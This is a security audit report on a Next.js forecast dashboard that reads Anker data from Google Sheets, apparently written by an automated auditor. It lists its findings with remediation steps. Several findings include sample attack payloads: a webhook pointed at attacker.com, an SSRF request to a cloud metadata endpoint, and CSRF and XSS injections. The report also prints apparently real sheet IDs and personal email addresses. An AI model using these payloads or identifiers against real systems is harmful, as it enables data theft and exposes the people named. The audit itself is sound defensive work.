# Data Flow & Security Audit — C2-CPFR Analysis Dashboard
> **Date:** 2026-02-20  
> **Auditor:** Knox (Automated Deep Audit)  
> **Project:** Analysis Dashboard — C2-CPFR  
> **Path:** `/Volumes/Bart_26/Dev_Expansion/Anker/analysis-dashboards/analysis-dashboards/c2-cpfr/`  
> **Stack:** Next.js 15, React 19, Google Sheets API (googleapis), Resend email, Tailwind CSS 4  
> **Deployment:** Vercel (c2-cpfr.vercel.app)

---

## Executive Summary

**Overall Risk Level: 🔴 CRITICAL**

This dashboard handles **Anker proprietary CPFR forecast data** shared under NDA with C2 Wireless / VoiceComm. The data includes pricing, forecast quantities, inventory levels, and sell-through metrics — information that competitors would find extremely valuable. Kyle has specifically noted that Anker IT monitors closely and data exposure is a **termination risk**.

**22 issues identified:** 8 CRITICAL, 7 HIGH, 5 MEDIUM, 2 LOW

### Critical Findings Summary
1. **REAL Google Service Account private key committed to `.env.local`** on disk — full plaintext PEM key in source tree
2. **REAL Anker Google Sheet ID exposed** in `.env.local.example` (committed file) — anyone with the ID can attempt to access the sheet
3. **ZERO authentication on ALL API endpoints** — anyone who discovers the Vercel URL can read all forecast data, submit accepts, send alerts
4. **Sync scripts contain REAL Anker sheet IDs and account emails** — hardcoded in `sync.sh` and `sync.py` (potentially committed to git)
5. **Change log stored as JSON file on filesystem** — ephemeral on Vercel (lost on redeploy), no access control
6. **Google Sheets API granted `spreadsheets` (read/write) scope** — service account can modify ANY sheet it's shared with, not just read
7. **Dashboard URL (`c2-cpfr.vercel.app`) is publicly accessible** — no auth gate, no IP allowlist, no Vercel password protection
8. **Resend API key and Slack webhook URL stored in client-accessible localStorage** — Settings modal stores sensitive configuration client-side

---

## Detailed Findings

### 🔴 CRITICAL-01: Service Account Private Key in Plaintext on Disk

**File:** `.env.local` (line 4-31)  
**Severity:** CRITICAL  
**OWASP:** A07:2021 — Security Misconfiguration  

The `.env.local` file contains a **complete RSA private key** for the Google service account `c2-cpfr-wireup@gmail-brain.iam.gserviceaccount.com`. This key grants full read/write access to any Google Sheet the service account has been shared with.

**Current state:**
```
GOOGLE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASC...
-----END PRIVATE KEY-----"
```

**Risk:** If this file is ever committed to git, pushed to a branch, copied to a backup, or read by a compromised dependency, the attacker gains:
- Read access to all Anker CPFR forecast data
- Write access to modify forecast numbers (data integrity attack)
- Ability to impersonate Kyle's operations
- Potential lateral movement to other sheets shared with the same service account

**Note:** The `.gitignore` correctly excludes `.env*.local`, but the key is in a service account from the `gmail-brain` GCP project — this same SA may be shared across multiple projects, amplifying blast radius.

**Remediation:**
1. Rotate this service account key immediately in GCP Console
2. Create a dedicated service account for C2-CPFR (not reusing `gmail-brain`'s SA)
3. Apply Principle of Least Privilege: grant the new SA read-only access to the specific sheets needed
4. On Vercel: use Vercel Environment Variables (encrypted at rest) — never store keys in files
5. Enable GCP audit logging on the service account for anomaly detection

---

### 🔴 CRITICAL-02: Real Anker Sheet ID in Committed Example File

**File:** `.env.local.example` (line 14)  
**Severity:** CRITICAL  
**OWASP:** A01:2021 — Broken Access Control  

```
ANKER_SHEET_ID=1GfRZBTAU_oHO6o0jtv_Q9lZRisUznrx9Sfu0_EbwHIs
```

The `.env.local.example` file is **not in `.gitignore`** — it's designed to be committed as a template. It contains the **real Anker CPFR Google Sheet ID**. While a Sheet ID alone doesn't grant access (sharing permissions still apply), it:
- Reveals which Google Sheet contains sensitive Anker data
- Enables targeted phishing/social engineering ("I need access to sheet 1GfR...")
- Combined with any leaked SA credentials, grants immediate access

**The mirror sheet ID is also exposed** in `.env.local`:
```
ANKER_SHEET_ID=1jeFQfH53UA0QFiUTc4oqEkdM3MKhzAFM6LEKJ0Ny_bc
```

**Remediation:**
1. Replace real Sheet IDs in `.env.local.example` with placeholder values: `your-google-sheet-id-here`
2. Audit git history for any commits containing real credentials
3. If the example file was committed with real IDs, consider the IDs compromised — rotate by creating new mirror sheets

---

### 🔴 CRITICAL-03: Zero Authentication on All API Endpoints

**Files:** `app/api/forecast/route.ts`, `app/api/accept/route.ts`, `app/api/alerts/route.ts`, `app/api/changes/route.ts`  
**Severity:** CRITICAL  
**OWASP:** A01:2021 — Broken Access Control  

**None of the four API routes have ANY authentication or authorization:**

| Endpoint | Method | What it does | Auth |
|----------|--------|-------------|------|
| `/api/forecast` | GET | Returns ALL Anker CPFR data (SKUs, pricing, forecasts, inventory) | ❌ NONE |
| `/api/accept` | POST | Records acceptance of forecast numbers, sends email alerts | ❌ NONE |
| `/api/alerts` | POST | Sends emails via Resend and Slack webhook messages | ❌ NONE |
| `/api/changes` | GET | Returns full change log of all accepts/updates | ❌ NONE |

**Attack scenarios:**
1. **Data exfiltration:** `curl https://c2-cpfr.vercel.app/api/forecast` → all Anker forecast data
2. **Spoofed acceptances:** POST to `/api/accept` with `{"direction":"anker_accepts_c2","scope":"all"}` → fake acceptance logged
3. **Email spam:** POST to `/api/alerts` with `{"type":"email","message":"fake alert"}` → sends emails from `noreply@bartlettlabs.io`
4. **Alert bombing:** POST to `/api/alerts` with `{"type":"webhook","message":"...","webhookUrl":"https://attacker.com"}` → leak webhook URL or SSRF

**Remediation:**
1. **Immediate:** Add Vercel Password Protection (Settings → General → Password Protection) to gate the entire deployment
2. **Short-term:** Implement API key authentication — generate a secret, require it as `Authorization: Bearer <key>` header
3. **Medium-term:** Add proper user authentication (e.g., Clerk, NextAuth, or Vercel's built-in auth)
4. **Enforce role-based access:** Anker users can accept C2's numbers, C2 users can accept Anker's numbers — not both

---

### 🔴 CRITICAL-04: Sync Scripts Contain Hardcoded Credentials

**Files:** `sync-anker-to-mirror.sh` (lines 7-10), `sync.py` (lines 12-16)  
**Severity:** CRITICAL  
**OWASP:** A07:2021 — Security Misconfiguration  

Both sync scripts contain hardcoded sensitive values:
```bash
ANKER_SHEET="1GfRZBTAU_oHO6o0jtv_Q9lZRisUznrx9Sfu0_EbwHIs"
MIRROR_SHEET="1jeFQfH53UA0QFiUTc4oqEkdM3MKhzAFM6LEKJ0Ny_bc"
ANKER_ACCOUNT="kyle.bartlett@anker.com"
PERSONAL_ACCOUNT="krbartle@gmail.com"
```

These files are not in `.gitignore` and are **designed to be committed** (they're operational scripts). Anyone with access to the repo sees:
- Kyle's work email and personal email
- Both Google Sheet IDs (source and mirror)
- The sync architecture (revealing that a mirror exists and how it's structured)

**Remediation:**
1. Move all IDs and emails to environment variables or a `.env` file
2. Add sync scripts to `.gitignore` or use a `.env.sync` file
3. Alternatively, use Git-crypt or SOPS for encrypting sensitive scripts

---

### 🔴 CRITICAL-05: Change Log Stored as Ephemeral JSON File

**File:** `lib/changeLog.ts`  
**Severity:** CRITICAL (data integrity)  
**OWASP:** A04:2021 — Insecure Design  

```typescript
const LOG_PATH = path.join(process.cwd(), 'data', 'changelog.json');
```

The change log (accept/update actions) is stored as a JSON file on the filesystem. On Vercel:
- **Serverless functions have ephemeral filesystems** — data is lost between invocations and on redeploy
- There is NO backup or persistence mechanism
- The file has no access control — any function can read/write
- The `data/` directory is created at runtime with `recursive: true` and no permission checks

**This means:**
- Accept/reject audit trail is **unreliable** — entries may vanish
- No way to verify historical actions in case of dispute between Anker and C2
- The `MAX_ENTRIES = 200` cap silently drops old entries

**Remediation:**
1. Replace filesystem storage with Vercel KV (Redis), Vercel Postgres, or Supabase
2. Add timestamps, IP addresses, and user identifiers to change log entries
3. Make the change log append-only (immutable audit trail)
4. Implement backup/export mechanism for compliance

---

### 🔴 CRITICAL-06: Overly Broad Google Sheets API Scope

**File:** `lib/sheets.ts` (line 17)  
**Severity:** CRITICAL  
**OWASP:** A01:2021 — Broken Access Control  

```typescript
const auth = new google.auth.JWT(email, undefined, key, [
  'https://www.googleapis.com/auth/spreadsheets',
]);
```

The service account requests `spreadsheets` scope (full read/write) instead of `spreadsheets.readonly`. This means:
- If the SA credentials leak, an attacker can **modify** forecast data, not just read it
- The `writeCpfrValues()` function in `sheets.ts` enables writing to ANY sheet the SA is shared with
- Data integrity attacks could go undetected — subtle changes to forecast numbers

**Note:** The `writeCpfrValues()` function exists but doesn't appear to be called from any API route currently. However, it's a loaded gun — the capability exists and could be exploited if an attacker crafts a direct API call.

**Remediation:**
1. If write access isn't needed in production, use `spreadsheets.readonly` scope
2. If write access IS needed (for accept operations), implement it through a separate write-specific SA with audit logging
3. Remove the `writeCpfrValues()` function if it's unused

---

### 🔴 CRITICAL-07: Dashboard Publicly Accessible Without Auth Gate

**File:** `vercel.json`, deployment configuration  
**Severity:** CRITICAL  
**OWASP:** A01:2021 — Broken Access Control  

The dashboard is deployed at `c2-cpfr.vercel.app` with no access restrictions:
- No Vercel password protection
- No SSO/SAML gate
- No IP allowlisting
- No VPN requirement

Anyone who guesses or discovers the URL has full access to Anker's proprietary forecast data.

**Discovery vectors:**
- Google dorking: `site:vercel.app "CPFR"` or `site:vercel.app "Anker"`
- Certificate Transparency logs show all Vercel subdomains
- The URL appears in the email templates (`alerts.ts` line 18): `<a href="https://c2-cpfr.vercel.app">`
- Slack webhook messages include a dashboard link

**Remediation:**
1. **Immediate:** Enable Vercel Password Protection
2. **Short-term:** Implement Vercel Authentication (Pro plan) or Clerk
3. **Medium-term:** Use a custom domain behind Cloudflare Access with Anker SSO

---

### 🔴 CRITICAL-08: Client-Side Storage of Sensitive Configuration

**File:** `app/page.tsx` (SettingsModal component, lines ~130-180)  
**Severity:** HIGH → CRITICAL (if webhook URL is populated)  
**OWASP:** A04:2021 — Insecure Design  

The Settings modal stores configuration in `localStorage`:
```typescript
localStorage.setItem('cpfr-alert-email', alertEmail);
localStorage.setItem('cpfr-webhook-url', webhookUrl);
localStorage.setItem('cpfr-auto-accept-c2', String(autoAcceptC2));
localStorage.setItem('cpfr-auto-accept-anker', String(autoAcceptAnker));
```

**Problems:**
- `localStorage` is accessible to **any JavaScript running on the same origin** (XSS → credential theft)
- Webhook URLs often contain authentication tokens (Slack webhooks = `https://hooks.slack.com/services/T.../B.../xxx`)
- Alert email addresses are PII
- These values are not sent to the server — the auto-accept toggles don't actually auto-accept anything server-side (UI-only, misleading)
- Any browser extension or injected script can read all localStorage values

**Remediation:**
1. Move sensitive configuration to server-side storage with authentication
2. If client-side storage is needed, use `httpOnly` cookies instead of `localStorage`
3. Remove the auto-accept toggles if they don't have server-side implementation (they currently don't)
4. Never store webhook URLs client-side — route through authenticated server API

---

### 🟡 HIGH-01: SSRF via Alert Webhook URL

**File:** `lib/alerts.ts` (line 53-75), `app/api/alerts/route.ts`  
**Severity:** HIGH  
**OWASP:** A10:2021 — Server-Side Request Forgery  

The `/api/alerts` endpoint accepts a `webhookUrl` parameter and the server makes an HTTP request to it:
```typescript
const url = req.webhookUrl || process.env.SLACK_WEBHOOK_URL;
const res = await fetch(url, { method: 'POST', ... });
```

**Attack:** An attacker can POST to `/api/alerts` with:
```json
{
  "type": "webhook",
  "message": "probe",
  "webhookUrl": "http://169.254.169.254/latest/meta-data/"
}
```

This enables:
- **SSRF to cloud metadata endpoints** (AWS/GCP/Azure instance metadata)
- **Internal network scanning** from Vercel's infrastructure
- **Data exfiltration** by pointing to attacker-controlled URLs with sensitive data in the payload

**Remediation:**
1. Remove the ability to specify arbitrary webhook URLs from the API request
2. Only use server-side configured webhook URLs from environment variables
3. If custom URLs are needed, validate against an allowlist of domains (e.g., `hooks.slack.com`, `outlook.office.com`)
4. Add URL validation: reject private IPs, localhost, link-local addresses

---

### 🟡 HIGH-02: No Rate Limiting on Any Endpoint

**Files:** All API routes  
**Severity:** HIGH  
**OWASP:** A04:2021 — Insecure Design  

No rate limiting exists on any endpoint:
- `/api/forecast` can be hammered to exhaust Google Sheets API quota (100 requests per 100 seconds per user)
- `/api/accept` can be spammed to flood the change log
- `/api/alerts` can be abused to send unlimited emails via Resend (free tier: 100/day, but paid plans have higher limits)
- `/api/alerts` with webhook type can be used for DDoS amplification

**Remediation:**
1. Implement Vercel's Edge Middleware rate limiting
2. Use `@vercel/kv` for a distributed rate limit counter
3. Set limits: `/api/forecast` → 60/min, `/api/accept` → 10/min, `/api/alerts` → 5/min

---

### 🟡 HIGH-03: Verbose Error Logging May Leak Sensitive Data

**Files:** `lib/sheets.ts` (line 173), `app/api/accept/route.ts`, all routes  
**Severity:** HIGH  
**OWASP:** A09:2021 — Security Logging and Monitoring Failures  

```typescript
console.error('Error reading Google Sheet:', err);
console.error('[accept] Error:', err);
```

Error objects may contain:
- Google API error responses with authentication details
- Stack traces revealing internal file paths
- Request/response bodies with forecast data
- Service account email addresses

On Vercel, `console.error` goes to **Vercel Logs**, which are accessible to all team members and retained for the plan's log retention period.

**Remediation:**
1. Sanitize error logging — extract only error code and message, not full error objects
2. Never log request bodies or authentication headers
3. Use structured logging with severity levels
4. Consider a dedicated logging service (e.g., Axiom, Datadog) with access controls

---

### 🟡 HIGH-04: No Input Validation on Accept Endpoint

**File:** `app/api/accept/route.ts`  
**Severity:** HIGH  
**OWASP:** A03:2021 — Injection  

The accept endpoint does minimal validation:
```typescript
const body: AcceptRequest = await req.json();
if (!body.direction || !body.scope) {
  return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
}
```

**Missing validations:**
- `direction` is not validated against the enum `'anker_accepts_c2' | 'c2_accepts_anker'` — any string is accepted
- `scope` is not validated against `'all' | 'sku'` — any string is accepted
- `sku` is not sanitized — could contain XSS payloads that render in the change log
- `weeks` array is not validated — could contain arbitrary strings
- No check that the referenced SKU actually exists in the forecast data

**Remediation:**
1. Use Zod schemas for runtime validation:
```typescript
const AcceptSchema = z.object({
  direction: z.enum(['anker_accepts_c2', 'c2_accepts_anker']),
  scope: z.enum(['all', 'sku']),
  sku: z.string().regex(/^[A-Z0-9-]+$/).optional(),
  weeks: z.array(z.string().regex(/^W\+\d+$/)).optional(),
});
```
2. Sanitize all string values before storing in change log
3. Validate SKU exists in current forecast data

---

### 🟡 HIGH-05: No CSRF Protection

**Files:** All POST routes  
**Severity:** HIGH  
**OWASP:** A01:2021 — Broken Access Control  

POST endpoints (`/api/accept`, `/api/alerts`) have no CSRF protection:
- No CSRF tokens
- No `SameSite` cookie checks (there are no cookies at all)
- No `Origin`/`Referer` header validation

**Attack:** If Kyle visits a malicious website while logged in to the dashboard, it can silently POST to `/api/accept` and record fake acceptances:
```html
<img src="x" onerror="fetch('https://c2-cpfr.vercel.app/api/accept',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({direction:'anker_accepts_c2',scope:'all'})})">
```

**Remediation:**
1. Once auth is added, implement CSRF tokens on all state-changing operations
2. Validate `Origin` header matches the deployment domain
3. Use `SameSite=Strict` cookies for authentication

---

### 🟡 HIGH-06: CDN-Loaded Chart.js from Third-Party Origin

**File:** `app/page.tsx` (line ~570)  
**Severity:** HIGH  
**OWASP:** A08:2021 — Software and Data Integrity Failures  

```typescript
script.src = 'https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js';
```

Chart.js is loaded dynamically from jsDelivr CDN at runtime. This introduces:
- **Supply chain risk:** If jsDelivr is compromised, malicious JS runs in the dashboard context
- **No Subresource Integrity (SRI):** The script tag has no `integrity` attribute — any modification is silently accepted
- **No Content Security Policy (CSP):** No CSP headers restrict script sources

**Remediation:**
1. Install Chart.js as an npm dependency: `npm install chart.js`
2. Import it directly: `import Chart from 'chart.js/auto'`
3. If CDN is preferred, add SRI hash: `integrity="sha256-..."`
4. Implement CSP headers in `next.config.ts` or `middleware.ts`

---

### 🟡 HIGH-07: Google Sheets API Read/Write Scope Reuses gmail-brain SA

**File:** `.env.local`  
**Severity:** HIGH  
**OWASP:** A01:2021 — Broken Access Control  

The service account `c2-cpfr-wireup@gmail-brain.iam.gserviceaccount.com` belongs to the `gmail-brain` GCP project. This creates cross-project blast radius:
- If this SA has access to other sheets (Gmail Brain's data, personal sheets), this dashboard's deployment can access them
- A vulnerability in C2-CPFR could compromise Gmail Brain's data and vice versa
- GCP audit logs would attribute C2-CPFR's access to the gmail-brain project, creating confusing audit trails

**Remediation:**
1. Create a dedicated GCP project for C2-CPFR (or at minimum a dedicated SA)
2. Grant the new SA access ONLY to the specific sheets it needs
3. Use separate SA keys for each project/deployment

---

### 🟠 MEDIUM-01: Forecast Data Fetched in Cleartext via API Response

**File:** `app/api/forecast/route.ts`  
**Severity:** MEDIUM  
**OWASP:** A02:2021 — Cryptographic Failures  

The `/api/forecast` endpoint returns ALL forecast data as a single JSON response with no redaction or filtering. The response includes:
- Every SKU's pricing information
- Full quarterly forecast breakdown
- Weekly forecast granularity (30 weeks)
- On-hand inventory levels
- Sell-through averages
- Customer classification

While HTTPS protects data in transit, this response is:
- Cached in the browser (no `Cache-Control: no-store` header)
- Visible in browser DevTools Network tab
- Potentially logged by browser extensions, corporate proxies, or Vercel's request logs

**Remediation:**
1. Add `Cache-Control: no-store, no-cache, must-revalidate` header to forecast response
2. Add `X-Content-Type-Options: nosniff` header
3. Consider field-level access control (e.g., C2 shouldn't see Anker's internal pricing)
4. Add data minimization — only return fields the current view needs

---

### 🟠 MEDIUM-02: Auto-Refresh Creates Repeated API Calls

**File:** `app/page.tsx` (fetchData, line ~470)  
**Severity:** MEDIUM  
**OWASP:** A04:2021 — Insecure Design  

```typescript
const interval = setInterval(fetchData, refreshInterval);
```

Default refresh is every 5 minutes. Each refresh hits both `/api/forecast` AND `/api/changes`. Each `/api/forecast` call:
1. Authenticates with Google Sheets API
2. Reads the entire sheet (`A1:CZ500` — up to 500 rows × ~100 columns)
3. Also calls Google Drive API to get `modifiedTime`

**Problems:**
- Multiple browser tabs = multiplied API calls (no coordination)
- If left open overnight: 288 Google Sheets API calls/day per tab
- Google Sheets API quota is 100 requests per 100 seconds — multiple users can easily hit this
- Each call transmits full Anker forecast data over the network

**Remediation:**
1. Implement server-side caching with smart invalidation (cache for 5 min, invalidate on write)
2. Use `stale-while-revalidate` pattern — serve cached data immediately, refresh in background
3. Add visibility check — pause refresh when browser tab is not active
4. Add a `Last-Modified` / `ETag` mechanism — only transfer data if sheet actually changed

---

### 🟠 MEDIUM-03: No Security Headers

**File:** `next.config.ts`  
**Severity:** MEDIUM  
**OWASP:** A05:2021 — Security Misconfiguration  

The Next.js config has no custom security headers. Missing:
- `Content-Security-Policy` (allows any script/style source)
- `X-Frame-Options` (dashboard can be embedded in iframes — clickjacking)
- `X-Content-Type-Options` (MIME sniffing attacks)
- `Referrer-Policy` (referrer header may leak the dashboard URL)
- `Permissions-Policy` (browser feature restrictions)
- `Strict-Transport-Security` (HSTS)

**Remediation:**
Add to `next.config.ts`:
```typescript
const nextConfig: NextConfig = {
  headers: async () => [{
    source: '/:path*',
    headers: [
      { key: 'X-Frame-Options', value: 'DENY' },
      { key: 'X-Content-Type-Options', value: 'nosniff' },
      { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
      { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'" },
    ],
  }],
};
```

---

### 🟠 MEDIUM-04: Fallback Data Contains Real-Looking Business Data

**File:** `lib/fallbackData.ts`  
**Severity:** MEDIUM  
**OWASP:** A04:2021 — Insecure Design  

The fallback data uses what appear to be **real Anker SKU numbers** and product descriptions:
```typescript
{ sku: 'A1367H11-1', desc: 'PowerPort III Nano 20W', price: 8.99, ... }
{ sku: 'A2698JZ1-1', desc: 'Anker 30W USB-C Charger', price: 1.25, ofc: 80136, ... }
```

These contain:
- Real Anker model numbers (A1367, A8189, A1618, etc.)
- Product pricing (even if approximate)
- Customer names (C2 Wireless, VoiceComm)
- Forecast quantities

This file is committed to git and visible to anyone with repo access.

**Remediation:**
1. Replace with clearly fake data: `SKU-001`, `Product A`, generic prices
2. Add a comment: `// SAMPLE DATA ONLY — does not reflect real Anker products or forecasts`
3. Or remove fallback data entirely and show a configuration prompt instead

---

### 🟠 MEDIUM-05: Email Alert HTML Template Vulnerable to XSS

**File:** `lib/alerts.ts` (lines 22-35)  
**Severity:** MEDIUM  
**OWASP:** A03:2021 — Injection  

The email template interpolates the `message` parameter directly into HTML:
```typescript
html: `<p style="line-height: 1.6;">${message}</p>`
```

If `message` contains HTML/JS (from the unvalidated `/api/accept` or `/api/alerts` endpoints), it becomes an XSS vector in email clients:
```json
{"type":"email","message":"<img src=x onerror=alert(1)>","subject":"test"}
```

While most email clients strip JavaScript, some render HTML fully, and the injection could be used for phishing (fake Anker branding with malicious links).

**Remediation:**
1. HTML-encode the message before interpolation
2. Use a template library that auto-escapes (e.g., React Email, MJML)
3. Validate and sanitize all user-provided content before including in emails

---

### 🟢 LOW-01: Console Logging in Production

**Files:** `lib/sheets.ts`, `app/api/forecast/route.ts`  
**Severity:** LOW  
**OWASP:** A09:2021 — Security Logging and Monitoring Failures  

Multiple `console.log` statements in production code:
```typescript
console.log('[forecast] Discovered columns:', Object.keys(ankerResult.columnMapping));
console.log('[forecast] Found', ankerResult.weekColumns.length, 'weekly columns');
```

While not directly a vulnerability, this leaks operational details into Vercel's log viewer.

**Remediation:**
1. Use `NODE_ENV` checks to suppress debug logs in production
2. Replace with structured logging that can be configured by environment

---

### 🟢 LOW-02: Outdated Chart.js Version Pinned

**File:** `app/page.tsx`  
**Severity:** LOW  

```
chart.js@4.4.0
```

Chart.js 4.4.0 was released in late 2023. The current version is 4.4.x (latest patch). While no known security CVEs affect Chart.js, pinning to a specific CDN version means security patches are never applied.

**Remediation:**
1. Best: install as npm dep (see HIGH-06)
2. If CDN: use semver range `chart.js@4` to get patches automatically (with SRI hash that auto-updates is not possible — another reason to use npm)

---

## Data Flow Map

```
┌─────────────────────────────────────────────────────────────────┐
│                        DATA SOURCES                             │
│  ┌──────────────┐        ┌──────────────┐     ┌──────────────┐ │
│  │ Anker CPFR   │        │ Mirror Sheet │     │ C2 Sheet     │ │
│  │ Google Sheet  │──sync──│ (Personal)   │     │ (Future)     │ │
│  │ @anker.com   │        │ @gmail.com   │     │              │ │
│  └──────────────┘        └──────┬───────┘     └──────┬───────┘ │
│                                 │                     │         │
│  ┌────────────────────────────────────────────────────┘         │
│  │  Google Sheets API (Service Account)                         │
│  │  Scope: spreadsheets (READ/WRITE) ⚠️                        │
│  │  SA: c2-cpfr-wireup@gmail-brain.iam                         │
│  └────────────┬───────────────────────────────────────────────  │
└───────────────┼─────────────────────────────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────────────────────────────┐
│                      VERCEL (c2-cpfr.vercel.app)                │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Next.js 15 Application                                  │   │
│  │                                                          │   │
│  │  GET /api/forecast ──────── Returns ALL forecast data    │   │
│  │        ↓                    (pricing, quantities, OH)    │   │
│  │  lib/sheets.ts ─── Google Sheets API ─── googleapis      │   │
│  │        ↓                                                 │   │
│  │  lib/fallbackData.ts ─── Hardcoded Anker SKU data ⚠️    │   │
│  │                                                          │   │
│  │  POST /api/accept ──────── Logs to filesystem JSON ⚠️   │   │
│  │        ↓                                                 │   │
│  │  lib/changeLog.ts ─── data/changelog.json (ephemeral)    │   │
│  │        ↓                                                 │   │
│  │  lib/alerts.ts ─────────── Resend email / Slack webhook  │   │
│  │                            (SSRF risk via webhookUrl) ⚠️ │   │
│  │                                                          │   │
│  │  POST /api/alerts ──────── Direct alert sending          │   │
│  │  GET  /api/changes ─────── Read changelog                │   │
│  │                                                          │   │
│  │  ❌ NO AUTH ON ANY ENDPOINT                              │   │
│  │  ❌ NO RATE LIMITING                                     │   │
│  │  ❌ NO CSRF PROTECTION                                   │   │
│  │  ❌ NO SECURITY HEADERS                                  │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│  CLIENT-SIDE (Browser)                                          │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  localStorage:                                           │   │
│  │    cpfr-alert-email       (PII) ⚠️                      │   │
│  │    cpfr-webhook-url       (credential) ⚠️               │   │
│  │    cpfr-auto-accept-c2    (config)                       │   │
│  │    cpfr-auto-accept-anker (config)                       │   │
│  │    cpfr-refresh-interval  (preference)                   │   │
│  │    cpfr-last-visit        (timestamp)                    │   │
│  │                                                          │   │
│  │  CDN Script: chart.js from cdn.jsdelivr.net ⚠️           │   │
│  │  No SRI, No CSP                                          │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────────────────────────────┐
│                     EXTERNAL SERVICES                           │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
│  │ Resend API   │  │ Slack/Teams  │  │ Google Drive API     │  │
│  │ Email alerts │  │ Webhook      │  │ (modifiedTime only)  │  │
│  │ From: noreply│  │ (if config'd)│  │                      │  │
│  │ @bartlettlabs│  │              │  │                      │  │
│  └──────────────┘  └──────────────┘  └──────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘

SYNC PIPELINE (Kyle's Mac, runs via cron every 15 min):
┌──────────────────┐    gog CLI     ┌──────────────────┐
│ Anker CPFR Sheet │──────read──────│ sync-anker-to-   │
│ (kyle.bartlett@  │                │ mirror.sh / .py  │
│  anker.com OAuth)│                │                  │
└──────────────────┘                │ Hardcoded IDs ⚠️ │
                                    │ Hardcoded emails⚠️│
┌──────────────────┐    gog CLI     │                  │
│ Mirror Sheet     │──────write─────│                  │
│ (krbartle@       │                │                  │
│  gmail.com OAuth)│                └──────────────────┘
└──────────────────┘
```

---

## Sensitive Data Inventory

| Data Element | Sensitivity | Where It Exists | Encrypted at Rest? | Access Controlled? |
|---|---|---|---|---|
| Google SA Private Key | 🔴 SECRET | `.env.local` on disk, Vercel env vars | ❌ Plaintext in file | ❌ Anyone with file access |
| Anker CPFR Sheet ID | 🟡 INTERNAL | `.env.local.example`, sync scripts | N/A | ❌ Committed to git |
| Mirror Sheet ID | 🟡 INTERNAL | `.env.local`, sync scripts | N/A | ❌ In committed scripts |
| Kyle's work email | 🟡 PII | `.env.local.example`, sync scripts | N/A | ❌ Committed to git |
| Kyle's personal email | 🟡 PII | sync scripts | N/A | ❌ In committed scripts |
| SKU pricing | 🔴 CONFIDENTIAL | API response, fallback data, browser cache | ❌ | ❌ No auth |
| Forecast quantities | 🔴 CONFIDENTIAL | API response, fallback data, browser cache | ❌ | ❌ No auth |
| On-hand inventory | 🔴 CONFIDENTIAL | API response, fallback data, browser cache | ❌ | ❌ No auth |
| Customer names | 🟡 INTERNAL | API response, fallback data | ❌ | ❌ No auth |
| Change log entries | 🟡 INTERNAL | Ephemeral JSON file on Vercel | ❌ | ❌ No auth |
| Resend API key | 🔴 SECRET | `.env.local`, Vercel env vars | ✅ (Vercel encrypted) | ✅ (server-only) |
| Slack Webhook URL | 🟡 CREDENTIAL | localStorage, env var | ❌ localStorage | ❌ Client-accessible |

---

## Prioritized Remediation Roadmap

### Phase 1: IMMEDIATE (This Week) — Stop the Bleeding
| # | Action | Risk Reduced | Effort |
|---|--------|-------------|--------|
| 1 | Enable Vercel Password Protection on c2-cpfr.vercel.app | CRITICAL-03, CRITICAL-07 | 5 min |
| 2 | Rotate Google SA key in GCP Console | CRITICAL-01 | 15 min |
| 3 | Replace real Sheet IDs in `.env.local.example` with placeholders | CRITICAL-02 | 5 min |
| 4 | Move hardcoded values in sync scripts to env vars | CRITICAL-04 | 30 min |
| 5 | Add `Cache-Control: no-store` header to `/api/forecast` response | MEDIUM-01 | 5 min |

### Phase 2: SHORT-TERM (This Sprint) — Fundamental Security
| # | Action | Risk Reduced | Effort |
|---|--------|-------------|--------|
| 6 | Add API key authentication to all endpoints | CRITICAL-03, HIGH-02 | 2 hrs |
| 7 | Add Zod validation to `/api/accept` and `/api/alerts` inputs | HIGH-04 | 1 hr |
| 8 | Remove `webhookUrl` from API request params (SSRF fix) | HIGH-01 | 30 min |
| 9 | Install Chart.js as npm dep, remove CDN load | HIGH-06 | 30 min |
| 10 | Add security headers in `next.config.ts` | MEDIUM-03 | 30 min |
| 11 | Change Google Sheets scope to `spreadsheets.readonly` | CRITICAL-06 | 10 min |
| 12 | Create dedicated GCP SA for C2-CPFR | HIGH-07 | 1 hr |

### Phase 3: MEDIUM-TERM (Next Sprint) — Production Hardening
| # | Action | Risk Reduced | Effort |
|---|--------|-------------|--------|
| 13 | Replace filesystem changelog with Vercel KV or Postgres | CRITICAL-05 | 3 hrs |
| 14 | Add proper user authentication (Clerk or NextAuth) | CRITICAL-03, HIGH-05 | 4 hrs |
| 15 | Implement server-side caching for Google Sheets data | MEDIUM-02 | 3 hrs |
| 16 | Replace fallback data with clearly fake data | MEDIUM-04 | 30 min |
| 17 | HTML-encode alert email content | MEDIUM-05 | 30 min |
| 18 | Move settings config from localStorage to authenticated server storage | CRITICAL-08 | 2 hrs |
| 19 | Add rate limiting via Vercel Edge Middleware | HIGH-02 | 2 hrs |
| 20 | Implement audit logging with IP, user agent, and user identity | CRITICAL-05 | 3 hrs |

---

## Compliance Considerations

### Anker Internal Policy
- Dashboard exposes proprietary CPFR data without authentication — **violation of information security policy**
- Service account reuses gmail-brain project — **no separation of concerns**
- Real Anker data in committed files (fallback data, Sheet IDs) — **data leakage risk**

### NDA with C2 Wireless / VoiceComm
- Dashboard footer states: *"CONFIDENTIAL — shared under NDA"*
- But the dashboard itself has no access controls — anyone can view this NDA-protected data
- Change log (audit trail) is ephemeral — no reliable record of who accepted what

### GDPR/Privacy
- Alert email storage in localStorage may expose PII to third-party scripts
- No data retention policy for change log entries
- No mechanism for data deletion on request

---

## Conclusion

